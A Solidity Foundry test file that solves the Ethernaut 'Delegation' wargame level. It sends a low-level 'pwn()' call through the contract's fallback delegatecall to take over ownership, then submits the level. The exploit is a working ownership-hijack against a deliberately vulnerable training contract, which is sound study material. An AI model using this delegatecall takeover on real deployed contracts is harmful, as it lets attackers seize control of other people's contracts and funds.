pragma solidity ^0.8.10;
// pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "forge-std/console.sol";
import "./Delegation.sol";
import "./DelegationFactory.sol";
import "../Ethernaut.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(10);

    function setUp() public {
        vm.deal(eoaAddress, 5 ether);
        // Deal EOA address some ether
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);

        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(levelAddress);
        
        console.log("owner");
        console.log(ethernautDelegation.owner());

        /////////////////
        // LEVEL HACK  //
        /////////////////
        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        
        address owner =  ethernautDelegation.owner();
        assertEq(owner, eoaAddress);        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);

        //forge test --match-path src/Ethernaut/Delegation/DelegationTest.t.sol -vvvv
  }
}
